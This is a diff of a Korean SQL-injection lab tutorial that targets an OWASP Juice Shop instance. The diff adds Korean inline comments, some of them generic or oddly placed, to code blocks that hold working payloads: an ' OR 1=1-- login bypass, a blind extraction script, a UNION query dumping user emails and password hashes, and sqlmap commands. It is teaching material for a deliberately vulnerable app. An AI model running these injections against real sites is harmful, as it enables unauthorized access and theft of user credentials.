@@ -145,25 +145,25 @@ SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에
 # 정상 로그인 시도 (실패)
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'
+  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'  # 요청 데이터(body)
 echo ""
 
 # SQLi 공격: ' OR 1=1-- 을 이메일에 삽입
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'\'' OR 1=1--","password":"anything"}' | python3 -m json.tool 2>/dev/null
+  -d '{"email":"'\'' OR 1=1--","password":"anything"}' | python3 -m json.tool 2>/dev/null  # 요청 데이터(body)
 echo ""
 
 # JSON 이스케이프 버전
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'"'"' OR 1=1--","password":"anything"}'
+  -d '{"email":"'"'"' OR 1=1--","password":"anything"}'  # 요청 데이터(body)
 echo ""
 
 # URL 인코딩 버전 (form-data 방식일 경우)
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'\'' or 1=1--","password":"x"}'
+  -d '{"email":"'\'' or 1=1--","password":"x"}'        # 요청 데이터(body)
 ```
 
 ### 2.2 특정 사용자로 로그인
@@ -224,15 +224,15 @@ curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+1=2--" | pyth
 
 ```bash
 # SQLite 버전의 첫 글자가 '3'인지 확인
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+SUBSTR(sqlite_version(),1,1)='3'--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null
+curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+SUBSTR(sqlite_version(),1,1)='3'--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null  # silent 모드
 
 # 자동화: 한 글자씩 추출
-python3 << 'PYEOF'
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 import requests, string
 
 url = "http://10.20.30.80:3000/rest/products/search"
 result = ""
-for pos in range(1, 20):
+for pos in range(1, 20):                               # 반복문 시작
     found = False
     for c in string.printable[:62] + ".":  # 알파벳+숫자+점
         q = f"test'))AND SUBSTR(sqlite_version(),{pos},1)='{c}'--"
@@ -305,7 +305,7 @@ UNION을 사용하려면 원래 쿼리의 컬럼 수를 알아야 한다.
 ```bash
 # ORDER BY로 컬럼 수 파악
 # 컬럼 수보다 큰 값을 넣으면 에러 발생
-for i in 1 2 3 4 5 6 7 8 9 10; do
+for i in 1 2 3 4 5 6 7 8 9 10; do                      # 반복문 시작
   result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))ORDER+BY+$i--")
   if echo "$result" | grep -qi "error"; then
     echo "컬럼 수: $((i-1))"
@@ -328,11 +328,11 @@ curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+sql,
 
 ```bash
 # Users 테이블 구조 확인 후 데이터 추출
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "
+curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "  # silent 모드
 import sys, json
 try:
     data = json.load(sys.stdin).get('data', [])
-    for item in data:
+    for item in data:                                  # 반복문 시작
         name = item.get('name', '')
         desc = item.get('description', '')
         if '@' in str(name) or '@' in str(desc):
@@ -365,6 +365,8 @@ sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
 
 ### 6.2 DB 정보 추출
 
+SQL Injection 취약점을 자동으로 탐지하고 테스트합니다.
+
 ```bash
 # 데이터베이스 목록
 sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
@@ -384,6 +386,8 @@ sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
 ```
 
 ### 6.3 POST 요청에 sqlmap 사용
+
+SQL Injection 취약점을 자동으로 탐지하고 테스트합니다.
 
 ```bash
 # 로그인 API에 대한 sqlmap
